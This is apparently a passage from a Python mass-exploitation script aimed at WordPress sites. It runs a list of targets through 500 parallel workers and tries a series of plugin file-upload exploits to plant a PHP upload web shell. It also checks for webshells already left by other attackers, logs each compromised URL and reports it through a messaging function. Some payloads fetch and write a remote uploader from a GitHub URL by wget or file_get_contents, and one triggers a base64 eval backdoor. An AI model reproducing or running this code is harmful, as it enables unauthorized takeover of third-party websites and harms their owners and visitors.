            check = requests.get(url+'/wp-content/plugins/TOPXOH/wDR.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('wso.txt', 'a').write(url + '/wp-content/plugins/TOPXOH/wDR.php\n')
                    SendMsg(url + '/wp-content/plugins/TOPXOH/wDR.php')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/wordpresss3cll/up.php',headers=headers, allow_redirects=True,timeout=15)
        if 'enctype="multipart/form-data"><input type="file" name="btul"><button>Gaskan<' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/wordpresss3cll/up.php\n')
                SendMsg(url + '/wp-content/plugins/wordpresss3cll/up.php')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/wp-file-upload/ROOBOTS.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Upl0od Your T0ols' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('ROOBOTS.txt', 'a').write(url + '/wp-content/plugins/wp-file-upload/ROOBOTS.php\n')
                    SendMsg(url + '/wp-content/plugins/wp-file-upload/ROOBOTS.php')
            else:
                print ' -| ' + url + ' --> {}[exploit-13]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[exploit-13]'.format(fr)


headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           'referer': 'www.google.com'}

shell = """<?php echo "BDKR28"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""



def exploit_1(url):
    try:
        data = open('files/a57bze8931.php', 'rb')
        listen = url + '/wp-content/plugins/dzs-zoomsounds/savepng.php?location=a57bze8931.php'
        dirr = url + '/wp-content/plugins/dzs-zoomsounds/a57bze8931.php'
        post = requests.post(listen, data=data, headers=headers, verify=False, timeout=15)
        opensite = requests.get(dirr, headers=headers, verify=False, timeout=15)
        if 'bdkr28' in opensite.content:
            print('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(dirr + '\n')
            SendMsg(dirr)
        else:
            print('--| {} [exploit-14]'.format(url))
    except:
        pass

def exploit_3(url):
    try:
        dirr = url + '/wp-content/plugins/ioptimization/a57bze8931.php'
        u = url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk'
        data = {'1': 'a57bze8931.php'}
        files = {'userfile': open('files/a57bze8931.php', 'rb')}
        x = requests.post(u, data=data, files=files, headers=headers, verify=False, timeout=15)
        gets = requests.get(dirr, headers=headers, verify=False, timeout=15)
        if 'bdkr28' in gets.content:
            rint('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(dirr + '\n')
            SendMsg(dirr)
        else:
            print('--| {} [exploit-15]'.format(url))
    except:
        pass

def exploit_5(url):
    try:
        files = {'file': open('files/a57bze8931.php', 'rb')}
        data = {'filename': 'a57bze8931.php'}
        dirrr = url + '/wp-content/plugins/wp-engine-module/a57bze8931.php'
        link = url + '/wp-content/plugins/wp-engine-module/wp-engine.php'
        r = requests.post(link, data=data, files=files, headers=headers, verify=False, timeout=20)
        opensite = requests.get(dirrr, headers=headers, verify=False, timeout=20)
        if 'bdkr28' in opensite.content:
            print('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(dirrr + '\n')
            SendMsg(dirrr)
        else:
            print('--| {} [exploit-16]'.format(url))
    except:
        pass

def exploit_6(url):
    try:
        target = url + '/wp-admin/admin-ajax.php?action=uploadFontIcon'
        dirrr = url + '/wp-content/uploads/kaswara/fonts_icon/a57bze8931/.__a57bze8931.php'
        files = {'fonticonzipfile': open('files/a57bze8931.zip', 'rb')}
        data = {'action': 'uploadFontIcon', 'fontsetname': 'a57bze8931', 'fonticonzipfile': 'uploadFontIcon'}
        request = requests.post(target, data=data, files=files, headers=headers, verify=False, timeout=20)
        check = requests.get(dirrr, headers=headers, verify=False, timeout=15)
        if 'bdkr28' in check.content:
            print('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(dirrr + '\n')
            SendMsg(dirrr)
        else:
            print('--| {} [exploit-17]'.format(url))
    except:
        pass

def exploit_7(url):
    try:
        filedata = {'filename': ('a57bze8931.php', shell, 'text/html')}
        vuln_directory = url + '/wp-content/plugins/apikey/apikey.php'
        shell_dir = url + '/wp-content/plugins/apikey/a57bze8931.php'
        send = requests.post(vuln_directory, files=filedata, headers=headers, verify=False, timeout=20)
        source = requests.get(shell_dir, headers=headers, verify=False, timeout=15)
        if 'bdkr28' in source.content:
            print('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(shell_dir + '\n')
            SendMsg(shell_dir)
        else:
            print('--| {} [exploit-18]'.format(url))
    except:
        pass

def exploit_8(url):
    try:
        Cherryup = {'file': open('files/a57bze8931.php', 'rb')}
        vuln_dir = url + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
        dir_shell = url + '/wp-content/plugins/cherry-plugin/admin/import-export/a57bze8931.php'
        send_request = requests.post(vuln_dir, files=Cherryup, headers=headers, verify=False, timeout=20)
        send_source = requests.get(dir_shell, headers=headers, verify=False, timeout=15)
        if 'bdkr28' in send_source.content:
            print('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(dir_shell + '\n')
            SendMsg(dir_shell)
        else:
            print('--| {} [exploit-19]'.format(url))

    except:
        pass

def exploit_9(url):
    try:
        formcraftup = {'files[]': open('files/a57bze8931.php', 'rb')}
        vuln_dir = url + '/wp-content/plugins/formcraft/file-upload/server/php/'
        shell_dir = url + '/wp-content/plugins/formcraft/file-upload/server/php/files/a57bze8931.php'
        send_request = requests.post(vuln_dir, files=formcraftup, headers=headers, verify=False, timeout=20)
        send_source = requests.get(shell_dir, headers=headers, verify=False, timeout=15)
        if 'bdkr28' in send_source.content:
            print('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(shell_dir + '\n')
            SendMsg(shell_dir)
        else:
            print('--| {} [exploit-20]'.format(url))
    except:
        pass

def exploit_10(url):
    try:
        data = {'action': 'add_custom_font'}
        files = {'file': open('files/a57bze8931.zip', 'rb')}
        dirr = url + '/wp-content/uploads/typehub/custom/a57bze8931/.__a57bze8931.php'
        target = url + '/wp-admin/admin-ajax.php'
        send = requests.post(target, data=data, files=files, headers=headers, verify=False, timeout=20)
        get_content = requests.get(dirr, headers=headers, verify=False, timeout=15)
        if 'bdkr28' in get_content.content:
            print('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(dirr + '\n')
            SendMsg(dirr)
        else:
            print('--| {} [exploit-21]'.format(url))
    except:
        pass

def exploit_12(url):
    try:
        files = {'myfile[]': ('abruzi.php4', shell, 'text/plain')}
        data = {'action':'gallery_from_files_595_fileupload', 'filesName':'myfile', 'allowExt':'php4', 'uploadDir':'/var/www/'}
        shell_dir = url + '/abruzi.php4'
        vuln_path = url + '/wp-admin/admin-ajax.php'
        payload = requests.post(vuln_path, files=files, data=data, headers=headers, verify=False, timeout=20)
        get_content = requests.get(shell_dir, headers=headers, verify=False, timeout=15)
        if 'bdkr28' in get_content.content:
            print('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(shell_dir + '\n')
            SendMsg(shell_dir)
        else:
            print('--| {} [exploit-22]'.format(url))
    except:
        pass

def exploit_13(url):
    try:
        data = {"2": "wget https://raw.githubusercontent.com/tanjim530/Private_exploit/main/uploader.txt -O king.php"}
        payload = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx'
        shell_dir = url + '/wp-content/king.php'
        target = url + '/wp-content/plugins/wpcargo/includes/barcode.php?text='+payload+'&sizefactor=.090909090909&size=1&filepath=../../../x.php'
        send = requests.get(target, headers=headers, verify=False, timeout=15)
        get_page = requests.post(url+'/wp-content/x.php?1=system', data=data, headers=headers, verify=False, timeout=20)
        get_shell = requests.get(shell_dir, headers=headers, verify=False, timeout=15)
        if 'bdkr28' in get_shell.content:
            print('--| {} [Successful]'.format(url))
            open('Shells.txt', 'a').write(shell_dir + '\n')
            SendMsg(shell_dir)
        else:
            print('--| {} [exploit-23]'.format(url))
    except:
        pass

def exploit_17(url):
    try:
        files = {'filename': open('files/a57bze8931.php', 'rb')}
        exploit = url + '/wp-content/plugins/gatewayapi/inc/css_js.php'
        send_payload = requests.post(exploit, files=files, headers=headers, verify=False, timeout=15)
        shell_dir = url + '/wp-content/plugins/gatewayapi/inc/a57bze8931.php'
        get_payload = requests.get(shell_dir, headers=headers, verify=False, timeout=20).content
        if 'bdkr28' in get_payload:
            print('--| {} [Successful-Xleet]'.format(url))
            open('Shells.txt', 'a').write(shell_dir + '\n')
            SendMsg(shell_dir)
        else:
            print('--| {} [exploit-24]'.format(url))
    except:
        pass

def FourHundredThreeuslk(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/mero-magazine/ws.php',headers=headers, allow_redirects=True,timeout=15)
        if " - WSO 5.5</title>" in check.content:
                print '-| ' + url + ('--> {}[Succefully]').format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/themes/mero-magazine/ws.php\n')
                SendMsg(url + '/wp-content/themes/mero-magazine/ws.php')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/mero-magazine/ws.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if " - WSO 5.5</title>" in check.content:
                    print '-| ' + url + ('--> {}[Succefully]').format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-content/themes/mero-magazine/ws.php\n')
                    SendMsg(url + '/wp-content/themes/mero-magazine/ws.php')
            else:
                print '-| ' + url + ('>{}[Failed]').format(fr)
        check = requests.get(url+'/wp-content/themes/mero-magazine/ws.php',headers=headers, allow_redirects=True,timeout=15)
        if " - WSO 5.5</title>" in check.content:
                print '-| ' + url + ('--> {}[Succefully]').format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/themes/mero-magazine/ws.php\n')
                SendMsg(url + '/wp-content/themes/mero-magazine/ws.php')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/mero-magazine/ws.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if " - WSO 5.5</title>" in check.content:
                    print '-| ' + url + ('--> {}[Succefully]').format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-content/themes/mero-magazine/ws.php\n')
                    SendMsg(url + '/wp-content/themes/mero-magazine/ws.php')
            else:
                print '-| ' + url + ('>{}[exploit-26]').format(fr)
    except :
        print '-| ' + url + ('>{}[exploit-26]').format(fr)

def exploit_19(url):
    try:
        dom = domain(url)
        url = URLdomain(url)
        if 'www.' in url:
            username = url.replace('www.', '')
        else:
            username = url
        if '.' in username:
            username = username.split('.')[0]
        if 'http://' in username:
            username = username.replace('http://', '')
        else:
            username = username.replace('https://', '')
        up = username.title()
        filename = id_generator()
        file_name = "uploader.php"
        shell_content = """$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/""" + file_name + """','w+'),file_get_contents('https://raw.githubusercontent.com/tanjim530/Private_exploit/main/uploader.txt'));echo "BDKR28".$x;"""
        data = {'vz': shell_content}
        check = requests.post(
            url + "/wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw==", data=data,
            headers=headers, verify=False, timeout=15).content
        print check
        if 'BDKR28' in check:
            print("-| {}   Success  (Found)").format(url)
            open("Uploader.txt", "a").write(url + "wp-admin/css/colors/blue/" + file_name + "\n")
            SendMsg(url + 'wp-admin/css/colors/blue/" + file_name')

        else:
            print("-| {}   Blue_Falid (Not ) ").format(url)
            open('badShell.txt', 'a').write(url + "\n")
    except:
        print ' -| ' + url + '--> {}[exploit-25]'.format(fr)

def all(url) :
    finder(url)
    checke(url)
    exploit(url)
    FourHundredThree(url)
    FourHundredThreee(url)
    exploit(url)
    Maper(url)
    checking(url)
    mar(url)
    exploit_two(url)
    Chitoge(url)
    exploit(url)
    xmlrpc(url)
    FourHundredThreebd(url)
    FourHundredThreebdd(url)
    Checkerrr(url)
    FourHundredThreeqwq(url)
    exploit_1(url)
    exploit_3(url)
    exploit_5(url)
    exploit_6(url)
    exploit_7(url)
    exploit_8(url)
    exploit_9(url)
    exploit_10(url)
    exploit_12(url)
    exploit_13(url)
    FourHundredThreeuslk(url)
    exploit_17(url)



try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
def main() :
    BDKR = Pool(int(500))
    BDKR.map(all, target)
main()